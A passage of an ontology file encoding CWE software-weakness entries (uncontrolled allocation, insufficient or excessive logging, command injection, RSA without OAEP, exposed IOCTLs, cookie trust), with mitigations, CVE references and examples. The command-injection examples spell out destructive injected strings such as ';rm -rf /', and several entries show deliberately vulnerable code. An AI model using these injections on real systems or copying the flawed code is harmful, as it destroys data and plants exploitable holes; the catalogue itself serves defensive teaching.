Example Language: Java 
public static final int SERVER_PORT = 4444;
public static final int MAX_CONNECTIONS = 10;
...

public void acceptConnections() {
try {
ServerSocket serverSocket = new ServerSocket(SERVER_PORT);
int counter = 0;
boolean hasConnections = true;
while (hasConnections) {
hasConnections = checkForMoreConnections();
Socket client = serverSocket.accept();
Thread t = new Thread(new ClientSocketThread(client));
t.setName(client.getInetAddress().getHostName() + \":\" + counter++);
ExecutorService pool = Executors.newFixedThreadPool(MAX_CONNECTIONS);
pool.execute(t);
}
serverSocket.close();


} catch (IOException ex) {...}
}"^^xsd:string, 
                 rdfs:comment "Example 5
An unnamed web site allowed a user to purchase tickets for an event. A menu option allowed the user to purchase up to 10 tickets, but the back end did not restrict the actual number of tickets that could be purchased.

Example 5 References:
[REF-667] Rafal Los. \"Real-Life Example of a 'Business Logic Defect' (Screen Shots!)\". 2011. <http://h30501.www3.hp.com/t5/Following-the-White-Rabbit-A/Real-Life-Example-of-a-Business-Logic-Defect-Screen-Shots/ba-p/22581>."^^xsd:string, 
                 rdfs:comment "Example 6
Here the problem is that every time a connection is made, more memory is allocated. So if one just opened up more and more connections, eventually the machine would run out of memory.

(bad code)
Example Language: C 
bar connection() {
foo = malloc(1024);
return foo;
}

endConnection(bar foo) {
free(foo);
}

int main() {
while(1) {
foo=connection();
}

endConnection(foo)
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated Dynamic Analysis
Certain automated dynamic analysis techniques may be effective in producing side effects of uncontrolled resource allocation problems, especially with resources such as processes, memory, and connections. The technique may involve generating a large number of requests to the software within a short time frame. Manual analysis is likely required to interpret the results."^^xsd:string
                 
                 dynamic  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "While fuzzing is typically geared toward finding low-level implementation bugs, it can inadvertently find uncontrolled resource allocation problems. This can occur when the fuzzer generates a large number of test cases but does not restart the targeted software in between test cases. If an individual test case produces a crash, but it does not do so reliably, then an inability to limit resource allocation may be the cause.
When the allocation is directly affected by numeric inputs, then fuzzing may produce indications of this weakness.
Effectiveness: Opportunistic"^^xsd:string
                 
                 fuzzing  ""^^xsd:string,
     
     Annotations: rdfs:comment "If the program must fail, ensure that it fails gracefully (fails closed). There may be a temptation to simply let the program fail poorly in cases such as low memory conditions, but an attacker may be able to assert control before the software has fully exited. Alternately, an uncontrolled failure could cause cascading problems with other downstream components; for example, the program could send a signal to a downstream process so the process immediately knows that a problem has occurred and has a better chance of recovery.
Ensure that all failures in resource allocation place the system into a safe posture."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation
Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
Note: This will only be applicable to cases where user input can influence the size or frequency of resource allocations."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Strategy: Resource Limitation
Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.
When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.
Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703)."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Clearly specify the minimum and maximum expectations for capabilities, and dictate which behaviors are acceptable when resource allocation reaches limits."^^xsd:string
                 
                 requirements  ""^^xsd:string,
     
     Annotations: rdfs:comment "Automated Static Analysis
Specialized configuration or tuning may be required to train automated tools to recognize this weakness.
Automated static analysis typically has limited utility in recognizing unlimited allocation problems, except for the missing release of program-independent system resources such as files, sockets, and processes, or unchecked arguments to memory. For system resources, automated static analysis may be able to detect circumstances in which resources are not released after they have expired, or if too much of a resource is requested at once, as can occur with memory. Automated analysis of configuration files may be able to detect settings that do not specify a maximum value.
Automated static analysis tools will not be appropriate for detecting exhaustion of custom resources, such as an intended security policy in which a bulletin board user is only allowed to make a limited number of posts per day."^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "Manual static analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. If denial-of-service is not considered a significant risk, or if there is strong emphasis on consequences such as code execution, then manual analysis may not focus on this weakness at all."^^xsd:string
                 
                 static  "manual"^^xsd:string,
     system_configuration  ""^^xsd:string
    
    
Individual: CWE-778_Insufficient_Logging

    Annotations: 
        rdfs:comment "When a security-critical event occurs, the software either does not record the event or omits important details about the event when logging it."^^xsd:string,
        rdfs:comment "When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "Microsoft Internet Information Services (IIS) 5.0 does not log requests that use the TRACK method, which allows remote attackers to obtain sensitive information without detection."^^xsd:string
                 
                 references  CVE-2003-1566,
     
     Annotations: rdfs:comment "The default configuration of the POP server in TCP/IP Services 5.6 for HP OpenVMS 8.3 does not log the source IP address or attempted username for login attempts, which might help remote attackers to avoid identification."^^xsd:string
                 
                 references  CVE-2007-1225,
     
     Annotations: rdfs:comment "The default configuration of the POP server in TCP/IP Services 5.6 for HP OpenVMS 8.3 does not log the source IP address or attempted username for login attempts, which might help remote attackers to avoid identification."^^xsd:string
                 
                 references  CVE-2007-3730,
     
     Annotations: rdfs:comment "The administrator interface for Adobe ColdFusion 8 and ColdFusion MX7 does not log failed authentication attempts, which makes it easier for remote attackers to conduct brute force attacks without detection."^^xsd:string
                 
                 references  CVE-2008-1203,
     
     Annotations: rdfs:comment "tog-pegasus in OpenGroup Pegasus 2.7.0 on Red Hat Enterprise Linux (RHEL) 5, Fedora 9, and Fedora 10 does not log failed authentication attempts to the OpenPegasus CIM server, which makes it easier for remote attackers to avoid detection of password guessing attacks."^^xsd:string
                 
                 references  CVE-2008-4315,
     ID  "778"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Use a centralized logging mechanism that supports multiple levels of detail. Ensure that all security-related successes and failures can be logged."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "If security critical information is not recorded, there will be no trail for forensic analysis and discovering the cause of problems or the source of attacks may become more difficult or impossible."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "The example below shows a configuration for the service security audit feature in the Windows Communication Foundation (WCF).

Example Language: XML  /*(bad code)*/
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=\"NewBehavior\">
<serviceSecurityAudit auditLogLocation=\"Default\"
suppressAuditFailure=\"false\"
serviceAuthorizationAuditLevel=\"None\"
messageAuthenticationAuditLevel=\"None\" />

...
</system.serviceModel>
The previous configuration file has effectively disabled the recording of security-critical events, which would force the administrator to look to other sources during debug or recovery efforts.

Logging failed authentication attempts can warn administrators of potential brute force attacks. Similarly, logging successful authentication events can provide a useful audit trail when a legitimate account is compromised. The following configuration shows appropriate settings, assuming that the site does not have excessive traffic, which could fill the logs if there are a large number of success or failure events (CWE-779).

Example Language: XML   /*(good code)*/
<system.serviceModel>
<behaviors>
<serviceBehaviors>
<behavior name=\"NewBehavior\">
<serviceSecurityAudit auditLogLocation=\"Default\"
suppressAuditFailure=\"false\"
serviceAuthorizationAuditLevel=\"SuccessAndFailure\"
messageAuthenticationAuditLevel=\"SuccessAndFailure\" />

...
</system.serviceModel>"^^xsd:string
                 
                 demonstrative_examples  "Example 1"^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "Be sure to set the level of logging appropriately in a production environment. Sufficient data should be logged to enable system administrators to detect attacks, diagnose errors, and recover from attacks. At the same time, logging too much data (CWE-779) can cause the same problems."^^xsd:string, 
                 rdfs:comment "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-779_Logging_of_Excessive_Data

    Annotations: 
        rdfs:comment "The software logs too much information, making log files hard to process and possibly hindering recovery efforts or forensic analysis after an attack."^^xsd:string,
        rdfs:comment "While logging is a good practice in general, and very high levels of logging are appropriate for debugging stages of development, too much logging in a production environment might hinder a system administrator's ability to detect anomalous conditions. This can provide cover for an attacker while attempting to penetrate a system, clutter the audit trail for forensic analysis, or make it more difficult to debug problems in a production environment."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1009_Audit,
     
     Annotations: rdfs:comment "anlgform.pl in Analog before 5.23 does not restrict access to the PROGRESSFREQ progress update command, which allows remote attackers to cause a denial of service (disk consumption) by using the command to report updates more frequently and fill the web server error log."^^xsd:string
                 
                 references  CVE-2002-1154,
     
     Annotations: rdfs:comment "BEA WebLogic Server 6.1 through 6.1 SP7, and 7.0 through 7.0 SP7 allows remote attackers to cause a denial of service (disk consumption) via requests containing malformed headers, which cause a large amount of data to be written to the server log."^^xsd:string
                 
                 references  CVE-2007-0421,
     ID  "779"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Support a maximum size for the log file that can be controlled by the administrator. If the maximum size is reached, the admin should be notified. Also, consider reducing functionality of the software. This may result in a denial-of-service to legitimate software users, but it will prevent the software from adversely impacting the entire system."^^xsd:string, 
                 rdfs:comment "Suppress large numbers of duplicate log messages and replace them with periodic summaries. For example, syslog may include an entry that states \"last message repeated X times\" when recording repeated events."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "DoS: Resource Consumption (CPU)"^^xsd:string,
     availability  "DoS: Resource Consumption (Other)"^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "Log files can become so large that they consume excessive resources, such as disk and CPU, which can hinder the performance of the system."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Adjust configurations appropriately when software is transitioned from a debug state to production."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Low"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "If system administrators are unable to effectively process log files, attempted attacks may go undetected, possibly leading to eventual system compromise."^^xsd:string, 
                 rdfs:comment "Logging too much information can make the log files of less use to forensics analysts and developers when trying to diagnose a problem or recover from an attack."^^xsd:string
                 
                 non-repudiation  "Hide Activities"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 operation  ""^^xsd:string
    
    
Individual: CWE-77_Improper_Neutralization_of_Special_Elements_used_in_a_Command

    Annotations: 
        rdfs:comment "Command injection vulnerabilities typically occur when:

1. Data enters the application from an untrusted source.
2. The data is part of a string that is executed as a command by the application.
3. By executing the command, the application gives an attacker a privilege or capability that the attacker would not otherwise have.
Command injection is a common problem with wrapper programs."^^xsd:string,
        rdfs:comment "Terminology
The \"command injection\" phrase carries different meanings to different people. For some people, it refers to refers to any type of attack that can allow the attacker to execute commands of their own choosing, regardless of how those commands are inserted. The command injection could thus be resultant from another weakness. This usage also includes cases in which the functionality allows the user to specify an entire command, which is then executed; within CWE, this situation might be better regarded as an authorization problem (since an attacker should not be able to specify arbitrary commands.)

Another common usage, which includes CWE-77 and its descendants, involves cases in which the attacker injects separators into the command being constructed."^^xsd:string,
        rdfs:comment "The software constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "Cause Web Server Misclassification"^^xsd:string
                 
                 related_attack_patterns  CAPEC-11,
     
     Annotations: rdfs:comment "LDAP Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-136,
     
     Annotations: rdfs:comment "Command Delimiters"^^xsd:string
                 
                 related_attack_patterns  CAPEC-15,
     
     Annotations: rdfs:comment "File Content Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-23,
     
     Annotations: rdfs:comment "Command Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-248,
     
     Annotations: rdfs:comment "Exploiting Multiple Input Interpretation Layers"^^xsd:string
                 
                 related_attack_patterns  CAPEC-43,
     
     Annotations: rdfs:comment "Argument Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-6,
     
     Annotations: rdfs:comment "Manipulating Writeable Configuration Files"^^xsd:string
                 
                 related_attack_patterns  CAPEC-75,
     
     Annotations: rdfs:comment "Manipulating Web Input to File System Calls"^^xsd:string
                 
                 related_attack_patterns  CAPEC-76,
     ID  "77"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "If at all possible, use library calls rather than external processes to recreate the desired functionality."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "If a malicious user injects a character (such as a semi-colon) that delimits the end of one command and the beginning of another, it may be possible to then insert an entirely new and unrelated command that was not intended to be executed."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The following simple program accepts a filename as a command line argument and displays the contents of the file back to the user. The program is installed setuid root because it is intended for use as a learning tool to allow system administrators in-training to inspect privileged system files without giving them the ability to modify them or damage the system.

(bad code)
Example Language: C 
int main(int argc, char** argv) {
char cmd[CMD_MAX] = \"/usr/bin/cat \";
strcat(cmd, argv[1]);
system(cmd);
}
Because the program runs with root privileges, the call to system() also executes with root privileges. If a user specifies a standard filename, the call works as expected. However, if an attacker passes a string of the form \";rm -rf /\", then the call to system() fails to execute cat due to a lack of arguments and then plows on to recursively delete the contents of the root partition.

Note that if argv[1] is a very long argument, then this issue might also be subject to a buffer overflow (CWE-120)."^^xsd:string, 
                 rdfs:comment "Example 2
The following code is from an administrative web application designed to allow users to kick off a backup of an Oracle database using a batch-file wrapper around the rman utility and then run a cleanup.bat script to delete some temporary files. The script rmanDB.bat accepts a single command line parameter, which specifies what type of backup to perform. Because access to the database is restricted, the application runs the backup as a privileged user.

(bad code)
Example Language: Java 
...
String btype = request.getParameter(\"backuptype\");
String cmd = new String(\"cmd.exe /K \\\"
c:\\\\util\\\\rmanDB.bat \"
+btype+
\"&&c:\\\\utl\\\\cleanup.bat\\\"\")

System.Runtime.getRuntime().exec(cmd);
...
The problem here is that the program does not do any validation on the backuptype parameter read from the user. Typically the Runtime.exec() function will not execute multiple commands, but in this case the program first runs the cmd.exe shell in order to run multiple commands with a single call to Runtime.exec(). Once the shell is invoked, it will happily execute multiple commands separated by two ampersands. If an attacker passes a string of the form \"& del c:\\\\dbms\\\\*.*\", then the application will execute this command along with the others specified by the program. Because of the nature of the application, it runs with the privileges necessary to interact with the database, which means whatever command the attacker injects will run with those privileges as well."^^xsd:string, 
                 rdfs:comment "Example 3
The following code from a system utility uses the system property APPHOME to determine the directory in which it is installed and then executes an initialization script based on a relative path from the specified directory.

(bad code)
Example Language: Java 
...
String home = System.getProperty(\"APPHOME\");
String cmd = home + INITCMD;
java.lang.Runtime.getRuntime().exec(cmd);
...
The code above allows an attacker to execute arbitrary commands with the elevated privilege of the application by modifying the system property APPHOME to point to a different path containing a malicious version of INITCMD. Because the program does not validate the value read from the environment, if an attacker can control the value of the system property APPHOME, then they can fool the application into running malicious code and take control of the system."^^xsd:string, 
                 rdfs:comment "Example 4
The following code is a wrapper around the UNIX command cat which prints the contents of a file to standard out. It is also injectable:

(bad code)
Example Language: C 
#include <stdio.h>
#include <unistd.h>

int main(int argc, char **argv) {

char cat[] = \"cat \";
char *command;
size_t commandLength;

commandLength = strlen(cat) + strlen(argv[1]) + 1;
command = (char *) malloc(commandLength);
strncpy(command, cat, commandLength);
strncat(command, argv[1], (commandLength - strlen(cat)) );

system(command);
return (0);
}
Used normally, the output is simply the contents of the file requested:

(informative)
 
$ ./catWrapper Story.txt
When last we left our heroes...
However, if we add a semicolon and another command to the end of this line, the command is executed by catWrapper with no complaint:

(attack code)
 
$ ./catWrapper Story.txt; ls
When last we left our heroes...
Story.txt
SensitiveFile.txt
PrivateData.db
a.out*
If catWrapper had been set to have a higher privilege level than the standard user, arbitrary commands could be executed with that higher privilege."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "If possible, ensure that all external commands called from the program are statically created."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     likelihood_of_exploit  "High"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Run time: Run time policy enforcement may be used in a whitelist fashion to prevent use of any non-sanctioned commands."^^xsd:string
                 
                 operation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Assign permissions to the software system that prevents the user from accessing/opening privileged files."^^xsd:string
                 
                 system_configuration  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-780_Use_of_RSA_Algorithm_without_OAEP

    Annotations: 
        rdfs:comment "Maintenance:
This entry could probably have a new parent related to improper padding, however the role of padding in cryptographic algorithms can vary, such as hiding the length of the plaintext and providing additional random bits for the cipher. In general, cryptographic problems in CWE are not well organized and further research is needed."^^xsd:string,
        rdfs:comment "Padding schemes are often used with cryptographic algorithms to make the plaintext less predictable and complicate attack efforts. The OAEP scheme is often used with RSA to nullify the impact of predictable common text."^^xsd:string,
        rdfs:comment "The software uses the RSA algorithm but does not incorporate Optimal Asymmetric Encryption Padding (OAEP), which might weaken the encryption."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "780"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "Without OAEP in RSA encryption, it will take less work for an attacker to decrypt the data or to infer patterns from the ciphertext."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
The example below attempts to build an RSA cipher.

(bad code)
Example Language: Java 
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(\"RSA/NONE/NoPadding\");
}
catch (java.security.NoSuchAlgorithmException e) {
log(\"this should never happen\", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(\"this should never happen\", e);
}
return rsa;
}
While the previous code successfully creates an RSA cipher, the cipher does not use padding. The following code creates an RSA cipher using OAEP.

(good code)
Example Language: Java 
public Cipher getRSACipher() {
Cipher rsa = null;
try {
rsa = javax.crypto.Cipher.getInstance(\"RSA/ECB/OAEPWithMD5AndMGF1Padding\");
}
catch (java.security.NoSuchAlgorithmException e) {
log(\"this should never happen\", e);
}
catch (javax.crypto.NoSuchPaddingException e) {
log(\"this should never happen\", e);
}
return rsa;
}"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     likelihood_of_exploit  "Medium"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-782_Exposed_IOCTL_with_Insufficient_Access_Control

    Annotations: 
        rdfs:comment "Applicable Platform:
Because IOCTL functionality is typically performing low-level actions and closely interacts with the operating system, this weakness may only appear in code that is written in low-level languages."^^xsd:string,
        rdfs:comment "Relationship:
This can be primary to many other weaknesses when the programmer assumes that the IOCTL can only be accessed by trusted parties. For example, a program or driver might not validate incoming addresses in METHOD_NEITHER IOCTLs in Windows environments (CWE-781), which could allow buffer overflow and similar attacks to take place, even when the attacker never should have been able to access the IOCTL at all."^^xsd:string,
        rdfs:comment "The software implements an IOCTL with functionality that should be restricted, but it does not properly enforce access control for the IOCTL."^^xsd:string,
        rdfs:comment "When an IOCTL contains privileged functionality and is exposed unnecessarily, attackers may be able to access this functionality by invoking the IOCTL. Even if the functionality is benign, if the programmer has assumed that the IOCTL would only be accessed by a trusted process, there may be little or no validation of the incoming data, exposing weaknesses that would never be reachable if the attacker cannot call the IOCTL directly.

The implementations of IOCTLs will differ between operating system types and versions, so the methods of attack and prevention may vary widely."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "782"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "In Windows environments, use proper access control for the associated device or device namespace. See References."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data."^^xsd:string
                 
                 availability  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data."^^xsd:string
                 
                 confidentiality  ""^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can invoke any functionality that the IOCTL offers. Depending on the functionality, the consequences may include code execution, denial-of-service, and theft of data."^^xsd:string
                 
                 integrity  ""^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 languages  "C"^^xsd:string,
     
     Annotations: rdfs:comment "Often Prevalent"^^xsd:string
                 
                 languages  "C++"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 operating_system  "Unix"^^xsd:string,
     
     Annotations: rdfs:comment "Undetermined Prevalence"^^xsd:string
                 
                 operating_system  "Windows"^^xsd:string
    
    
Individual: CWE-784_Reliance_on_Cookies_without_Validation_and_Integrity_Checking_in_a_Security_Decision

    Annotations: 
        rdfs:comment "Attackers can easily modify cookies, within the browser or by implementing the client-side code outside of the browser. Attackers can bypass protection mechanisms such as authorization and authentication by modifying the cookie to contain an expected value."^^xsd:string,
        rdfs:comment "Maintenance:
A new parent might need to be defined for this entry. This entry is specific to cookies, which reflects the significant number of vulnerabilities being reported for cookie-based authentication in CVE during 2008 and 2009. However, other types of inputs - such as parameters or headers - could also be used for similar authentication or authorization. Similar issues (under the Research view) include CWE-247 and CWE-472."^^xsd:string,
        rdfs:comment "The application uses a protection mechanism that relies on the existence or values of a cookie, but it does not properly ensure that the cookie is valid for the associated user."^^xsd:string
    
    Types: 
        Variants
    
    Facts:  
     categories_member  CWE-1012_Cross_Cutting,
     
     Annotations: rdfs:comment "e-dating application allows admin privileges by setting the admin cookie to 1."^^xsd:string
                 
                 references  CVE-2008-5784,
     
     Annotations: rdfs:comment "Web-based email list manager allows attackers to gain admin privileges by setting a login cookie to \"admin.\""^^xsd:string
                 
                 references  CVE-2008-6291,
     
     Annotations: rdfs:comment "Content management system allows admin privileges by setting a \"login\" cookie to \"OK.\""^^xsd:string
                 
                 references  CVE-2009-0864,
     
     Annotations: rdfs:comment "Attacker can bypass authentication by setting a cookie to a specific value."^^xsd:string
                 
                 references  CVE-2009-1549,
     
     Annotations: rdfs:comment "Attacker can bypass authentication and gain admin privileges by setting an \"admin\" cookie to 1."^^xsd:string
                 
                 references  CVE-2009-1619,
     ID  "784"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred."^^xsd:string
                 
                 access_control  "Bypass Protection Mechanism"^^xsd:string,
     
     Annotations: rdfs:comment "It is dangerous to use cookies to set a user's privileges. The cookie can be manipulated to claim a high level of authorization, or to claim that successful authentication has occurred."^^xsd:string
                 
                 access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
